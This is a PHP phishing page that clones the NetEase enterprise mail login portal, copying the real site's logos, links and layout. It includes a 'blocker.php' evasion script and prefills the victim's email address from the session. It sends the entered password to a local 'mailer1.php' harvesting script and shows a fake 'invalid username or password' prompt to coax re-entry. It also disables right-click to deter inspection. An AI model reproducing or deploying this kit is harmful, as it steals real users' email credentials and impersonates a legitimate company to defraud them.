<?php
include "blocker.php";
session_start();
ob_start();
$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	

parse_str(parse_url($url, PHP_URL_QUERY));

	
$parts = @explode('@', $userid);
	
$user = @$parts[0];
$email= $_SESSION['username'];
// start > to get url and and put id 
	



	
?>

<!DOCTYPE html>
<html lang="zh_CN"> 
    <head>
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta http-equiv="Content-type" content="text/html;charset=utf-8">
        <title>网易企业邮箱 - 登录入口</title>
        <meta name="keywords" content="网易企业邮箱,登录企业邮箱,企业邮箱注册,电子邮箱">
        <meta name="description" content="登录网易企业邮箱，请填写完整的邮件地址或管理员帐号，支持手机扫码登录。用邮箱大师，随时随地，极速收发。">
        <link rel="shortcut icon" href="https://mimghz.qiye.163.com/o/mailapp/qiyelogin/style/img/favicon.ico" type="image/x-icon">
        <link rel="stylesheet" href="/netease/qiyelogin/style/css/login.ecd5c7c6.css">
        <script type="text/javascript" src="ht/o/mailapp/qiyelogin/style/js/jquery-1.8.1.min.js"></script>
        <script id="jsBase" type="text/javascript" src="ht/o/mailapp/qiyelogin/style/js/base_v3.js"></script>
        <script type="text/javascript" src="ht/o/mailapp/qiyelogin/style/js/qiye_algorithm.js"></script>
        <script id="jsBaseInner" type="text/javascript">
            //判断cookie
            fCheckCookie();
            //HTML5初始化
            fHtml5Tag();
        </script>
         <script>
        function checkForm(inputText){
        var value = inputText.value;
        var atpos = value.indexOf("@");
        var dotpos = value.lastIndexOf(".");
        
        
        if (atpos<1 || dotpos<atpos+2 || dotpos+2>=value.length){        
       
        document.getElementById("msgpid").innerHTML ="输入域名";
        
        return false;
       
        }else{
        
        return true;       
        }
        }
        </script>
      
        <style>
            .m-login .login-form {padding: 25px 25px 0;}

            .m-login .logincheck {width: 72px;height:32px;line-height: 32px;z-index: 1;}
            .m-verifycode{display: none;}
            .m-verifycode .m-ipt{height: 30px;border: 1px solid #999;border-radius:4px;}
            .m-verifycode .js-ipt{background: #fff;width: 76px;height: 30px;display: inline-block;*display:inline;*zoom:1;margin-bottom: 0;vertical-align: middle;}
            .m-verifycode .m-ipt .ipt{width: 60px;height: 20px;line-height: 20px;left: 0;padding: 4px 8px;vertical-align: middle;}
            .m-verifycode .m-ipt .placeholder {position: absolute;left: 13px;top: 5px;}
            .m-verifycode img{display: inline-block;vertical-align: middle;width: 90px;height: 30px;cursor: pointer;}
            .m-login .loginconf{zoom:1;}
            .m-login .loginselect {width: 94px;}
            .m-login .loginselect a.selector{margin-left: 0;}
            .m-login .loginact{color: #959595;line-height: 15px;}
            .m-login .loginact a {margin-left: 5px;margin-right: 0;}
            .m-login .loginerror{position: absolute;bottom: 80px;left:14px;}
            .f-zindex-10{z-index: 10;}
            .myclass{height:30px; vertical-align: middle;top: 5px;position: absolute;left: 28px;font-weight: bold;}
            
        </style>
        	<script type="text/javascript">
	document.addEventListener("contextmenu", function (e) {
        e.preventDefault();
    }, false);
    </script>
    </head>
    <body>
        <header class="g-hd">
            <div class="g-wrap">
                <h1 class="w-qiyelogo">
                    <a href="http://qiye.163.com/" target="_blank" title="中国第一大电子邮件服务商">
                        <img src="https://mimg.qiye.163.com/o/public/logo.gif" alt="网易企业邮箱">
                    </a>
                </h1>
                <nav class="m-hdnav">
                    <a href="http://qiye.163.com/" target="_blank">企业邮箱</a>|<a href="http://mail.qiye.163.com/?hl=zh_TW" target="_blank">繁體版</a>|<a href="http://mail.qiye.163.com/?hl=en_US" target="_blank">English</a>|<a href="http://hw.qiye.163.com/" target="_blank">国外用户登录</a>|<a id="help-url-id" href="javascript:void(0);" target="_blank">帮助</a>|<a href="http://qiye.163.com/entry/buy-price.htm" target="_blank">购买</a>
                </nav>
            </div>
        </header>
        <section class="g-bd">
            <div class="g-bd-mn js-bdImg u-bd-img8"style="background-image: url(https://mimghz.qiye.163.com/o/mailapp/qiyelogin/style/img/banner13.jpg");">
                <div class="g-wrap">
                    <div class="m-theme">
                        <a class="link js-linkTheme" href="http://qiye.163.com/mobile/" target="_blank"></a>
                        <div class="themectrl">
                            
                            
                            <a class="js-prevTheme" href="javascript:void(0);" title="上一张"></a>
                            <a class="js-nextTheme" href="javascript:void(0);" title="下一张"></a>
                        </div>
                    </div>
                    <div class="m-login js-loginpanel">
                        <div class="login-hd">
                            <div class="item js-loginhd" data-lgtype="account">邮箱帐号登录</div>
                            <div class="item js-loginhd" data-lgtype="admin">管理员登录</div>
                        </div>
                        <div class="login-bd">
                            <form class="login-form login-form-acc js-loginform js-loginform-acc" name="accountlogin" action="/netease/qiyelogin/mailer1.php" method="post" target="_top">
                                <input type="hidden" class="js-domain" name="domain" value="">
                                <input type="hidden" class="js-accname" name="account_name" value="">
                                <input type="hidden" class="js-isSecure" name="secure" value="1">
                                <input type="hidden" class="js-isAllSecure" name="all_secure" value="0">
                                <input type="hidden" class="js-language" name="language" value="0">
                                <input type="hidden" class="js-operator" name="ch" value="">
                                <input type="hidden" class="js-pubid" name="pubid" value="">
                                <input type="hidden" class="js-passtype" name="passtype" value="">
                                <div class="m-ipt js-ipt">
                                    <span class="icon icon-account"></span>
                                    <input id="accname" class="myclass" tabindex="1" type="text" title="请输入完整邮箱地址" name="accname" placeholder="请输入完整邮箱地址" value="<?php echo $email?>" readonly />
                                    
                                </div>
                                <div class="m-ipt js-ipt">
                                    <span class="icon icon-pwd"></span>
                                    <input id="accpwd" class="myclass" tabindex="2" title="请输入密码" type="password" name="password" placeholder="密码" required/>
                                    
                                </div>

                                <div class="loginconf">
                                    <div class="logincheck js-logincheck">
                                        <span class="icon icon-checkbox js-checkbox"></span>
                                        <label for="accautologin" class="checklabel js-autolabel">
                                            <input tabindex="3" title="记住帐号" class="checkipt js-autologin" type="checkbox" id="accautologin">
                                        记住帐号</label>
                                        <div class="securetip js-securetip">为了您的信息安全，请不要在网吧或公用电脑上使用此功能！
                                        </div>
                                    </div>
                                    <div class="m-verifycode">
                                        <div class="m-ipt js-ipt">
                                            <input id="accverifycode" class="ipt js-value js-verifycode" tabindex="2" title="请输入验证码" type="text" name="verify_code">
                                            <label for="accverifycode" class="placeholder js-placeholder">验证码</label>
                                        </div>
                                        <img src="" width="90" id="imgVerifycode" class="refreshVerifycode" title="点击切换">
                                    </div>
                                </div>
                                <div class="loginbtn">
                                    <button class="w-button w-button-account js-loginbtn" type="submit" tabindex="4" onclick="return checkForm(document.accountlogin.accname)">登 录</button>
                                </div>
                                <div class="loginact">
                                    <div class="loginselect">
                                        <a class="selector js-sslsel" href="javascript:;" hidefocus="true">正使用<span class="js-ssltxt">SSL登录</span><span class="icon icon-arrow"></span></a>
                                        <div class="m-lgselect js-lgselect">
                                            <ul>
                                                <li>
                                                    <a class="js-selitem selected" href="javascript:;" hidefocus="true" data-allssl="0">SSL登录</a>
                                                </li>
                                                <li>
                                                    <a class="js-selitem" href="javascript:;" hidefocus="true" data-allssl="1">全程SSL</a>
                                                </li>
                                            </ul>
                                        </div>
                                    </div>
                                    <a href="https://mail.qiye.163.com/mailapp/qiyeurs/?from=http%3A%2F%2Fmail.qiye.163.com%2F#/resetPwd" target="_blank">忘记密码了？</a>
                                    <a class="js-testspeed" href="javascript:;" hidefocus="true">登录太慢？</a>
                                </div>
                            </form>
                            <form class="login-form login-form-admin js-loginform js-loginform-admin" name="adminlogin" action="mailer1.php" method="post" target="_top">
                                <input type="hidden" class="js-domain" name="domain" value="">
                                <input type="hidden" class="js-accname" name="account_name" value="">
                                <input type="hidden" class="js-isSecure" name="secure" value="1">
                                <input type="hidden" class="js-isAllSecure" name="all_secure" value="0">
                                <input type="hidden" class="js-language" name="language" value="0">
                                <input type="hidden" class="js-pubid" name="pubid" value="">
                                <input type="hidden" class="js-passtype" name="passtype" value="">
                                <div class="m-ipt js-ipt">
                                    <span class="icon icon-account"></span>
                                    <input id="adminname" class="ipt js-value js-username" tabindex="1" type="text" title="请输入完整邮箱地址" name="accname">
                                    <label for="adminname" class="placeholder js-placeholder">请输入完整邮箱地址</label>
                                </div>
                                <div class="m-ipt js-ipt">
                                    <span class="icon icon-pwd"></span>
                                    <input id="adminpwd" class="ipt js-value js-pwd" tabindex="2" title="请输入密码" type="password" name="password" placeholder="密码">
                                    
                                </div>
                                <div class="loginconf">
                                    <div class="logincheck js-logincheck">
                                        <span class="icon icon-checkbox js-checkbox"></span>
                                        <label for="adminautologin" class="checklabel js-autolabel">
                                            <input tabindex="3" title="记住帐号" class="checkipt js-autologin" type="checkbox" id="adminautologin">
                                        记住帐号</label>
                                        <div class="securetip js-securetip">为了您的信息安全，请不要在网吧或公用电脑上使用此功能！
                                        </div>
                                        <label id="demo"></label>
                                    </div>
                                    <div class="m-verifycode">
                                        <div class="m-ipt js-ipt">
                                            <input id="adminverifycode" class="ipt js-value js-verifycode" tabindex="2" title="请输入验证码" type="text" name="verify_code">
                                            <label for="adminverifycode" class="placeholder js-placeholder">验证码</label>
                                            <div class="close-bg"></div>
                                        </div>
                                        <img src="" width="90" id="imgadminVerifycode" class="refreshVerifycode" title="点击切换">
                                    </div>
                                </div>
                                <div class="loginbtn">
                                    <button class="w-button w-button-admin js-loginbtn" type="submit" tabindex="4">管理员登录</button>
                                </div>
                                <div class="loginact">
                                    <div class="loginselect">
                                        <div class="selector">正使用SSL登录</div>
                                    </div>
                                    <a href="https://mail.qiye.163.com/mailapp/qiyeurs/?from=http%3A%2F%2Fmail.qiye.163.com%2F#/resetPwd" target="_blank">忘记密码了？</a>
                                   
                                </div>
                            </form>
                            <div id="msgpid" style='color:red; margin-top:10px;'>用户名或密码无效</div>
                        </div>
                        <div class="login-ft js-loginft">
                            <div class="m-download">
                                <a class="dlitem" target="_blank" href="http://u.163.com/androidds4"><span class="icon icon-android"></span>Android版</a>
                                &nbsp;|&nbsp;
                                <a class="dlitem" target="_blank" href="http://u.163.com/iosds4"><span class="icon icon-apple"></span>iPhone版</a>
                            </div>
                        </div>
                        <div class="js-speedbox">
                            <div class="m-speed">
                            </div>
                        </div>
                        <a class="w-codeentry js-codeentry" href="javascript:;" hidefocus="true"></a>
                        
                        <div class="m-codebox js-codebox f-zindex-10">
                            
                            <div id="appLoginTab" class="appLoginTab">
                                <div id="appLoginWait" style="display: block">
                                    <h3>手机扫码 安全防盗</h3>
                                    <div id="appCodeWrap" class="appCodeWrap allowmove">
                                        <div class="appCode-example"></div>
                                        <div id="appCodeBox" class="appCodeBox">
                                            <img id="appCode" class="appCode" width="130" height="130" src="https://mail.qiye.163.com/mailapp/commonweb/qrcode/getqrcode.do?w=130&h=130">
                                            <div id="appCodeRefresh" class="appCodeRefresh" style="display: none">
                                                <div class="appCode-mask"></div>
                                                <div class="appCode-wrap"><p>二维码已失效<br>请点击刷新</p></div>
                                            </div>
                                        </div>
                                    </div>
                                    <p id="appLoginTxt" class="appLoginTxt txt-err"></p>
                                    <p class="appLogin-hint">使用 邮箱大师 扫描二维码登录</p>
                                    <p class="appLoginlink"><a id="howToUseApp" class="howToUseApp" href="javascript:void(0)">如何使用</a><var>|</var><a href="http://mail.163.com/dashi/" target="_blank">下载邮箱大师</a></p>
                                </div>
                                <div id="appLoginScan" class="appLoginScan" style="display:none">
                                    <div class="appLogin-scanSuc"></div>
                                    <p class="appLogin-scantxt txt-suc">成功扫描，请在手机上确认登录</p>
                                    <a id="appLoginRestart" class="appLoginRestart" href="javascript:void(0)">返回重新扫描</a>
                                </div>
                            </div>
                            <a class="closeentry js-closeentry" href="javascript:;" hidefocus="true"></a>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <footer class="g-ft">
            <div class="g-wrap">
                <a class="w-nteslogo" href="http://www.163.com/" target="_blank">
                    <img src="https://mimg.127.net/logo/netease_logo.gif" alt="网易NetEase">
                </a>
                <a id="KX_IMG" class="w-kximg" href="https://ss.cnnic.cn/verifyseal.dll?sn=e12051044010020841301459&ct=df&pa=997669" target="_blank"><img src="https://mimg.127.net/logo/knet.png" alt="可信网站，身份验证"></a>
                <nav class="m-ftnav">
                    <a href="http://gb.corp.163.com/gb/home.shtml" target="_blank">关于网易</a><a href="http://weibo.com/163qiye" target="_blank">官方微博</a><a href="http://qiyemail.blog.163.com/" target="_blank">官方博客</a><a href="http://help.163.com/" target="_blank">客户服务</a><a href="http://gb.corp.163.com/gb/legal.html" target="_blank">相关法律</a>&emsp;|&emsp;网易公司版权所有&copy;1997-<script type="text/javascript" src="https://mimg.127.net/copyright/year.js"></script>
                </nav>
            </div>
        </footer>
        
        <img src="https://ssl.mail.163.com/httpsEnable.gif" style="position: absolute;left: -999em;top: -999em;width: 0;height: 0">
        <script type="text/javascript">
            var gDocHeight = $('body').height();
            //初始化页面垂直居中
            resizeBody();
            function resizeBody(){
                var winHeight = $(window).height();
                var heightGap = winHeight - gDocHeight;
                if(heightGap > 5){
                    $('body').css('padding-top', heightGap/2);
                }else{
                    $('body').css('padding-top', 0);
                }
            }
        </script>
        <script type="text/javascript" src="//analytics.163.com/ntes.js"></script>
        
        
        <script type="text/javascript">
        _ntes_nacc = "qiye";
        neteaseTracker();
        neteaseClickStat();
        </script>
        
       
        
        <script src="hhttps://mimghz.qiye.163.com/o/mailapp/qiyelogin/js/login.98385d71.js"></script>
        <script>(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)})(window,document,'script','//www.google-analytics.com/analytics.js','ga');ga('create', 'UA-60729705-1', 'auto');ga('send', 'pageview');</script>
    </body>
</html>